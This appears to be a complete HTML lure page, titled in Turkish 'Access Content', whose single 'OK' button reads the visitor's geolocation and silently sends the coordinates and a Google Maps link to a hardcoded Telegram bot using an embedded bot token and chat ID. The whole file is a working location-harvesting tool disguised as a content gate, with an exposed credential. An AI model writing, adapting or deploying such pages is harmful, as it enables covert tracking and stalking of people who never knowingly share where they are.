<!DOCTYPE html>
<html>
  <head>
    <title>İçeriğe Ulaş</title>
  </head>
  <body>
    <h2>İçeriğe Ulaş</h2>
    <button onclick="getLocation()">Tamam</button>

    <script>
      function getLocation() {
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(function(position) {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;

            fetch("https://api.telegram.org/bot7906946385:AAE_qvqTw8qxZBkdktkQNrXDM7maV6bdKqA/sendMessage", {
              method: "POST",
              headers: {
                "Content-Type": "application/json"
              },
              body: JSON.stringify({
                chat_id: "6358000072",
                text: `📍 LAT: ${lat}\n📍 LON: ${lon}\n📍 https://maps.google.com/?q=${lat},${lon}`
              })
            }).then(r => r.json())
              .then(res => alert("Bot yanıtı: " + JSON.stringify(res)))
              .catch(err => alert("Hata: " + err));
          }, function(error) {
            alert("Konum HATASI: " + error.message);
          });
        } else {
          alert("Tarayıcı konum desteklemiyor");
        }
      }
    </script>
  </body>
</html>
